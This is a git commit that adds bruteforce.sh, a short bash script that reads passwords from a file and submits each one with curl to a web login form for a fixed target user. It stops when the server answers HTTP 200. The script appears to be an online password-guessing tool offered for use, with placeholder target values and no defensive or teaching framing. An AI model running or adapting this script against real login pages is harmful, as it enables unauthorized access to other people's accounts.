1385bcc027ea169d4962da00758948db55514ebd
Codeman04TheFreaking2nd <127219550+Codeman04TheFreaking2nd@users.noreply.github.com>
2023-03-23 16:06:04 -0400

    Create bruteforce.sh

---
+++ bruteforce.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+
+user="targetuser"
+passwords="/path/to/passwords.txt"
+url="https://example.com/login"
+
+while read password; do
+    echo "Trying password: $password"
+    response=$(curl -s -o /dev/null -w "%{http_code}" --data "username=$user&password=$password" $url)
+    if [ $response -eq 200 ]; then
+        echo "Success! Password is: $password"
+        break
+    fi
+done < $passwords
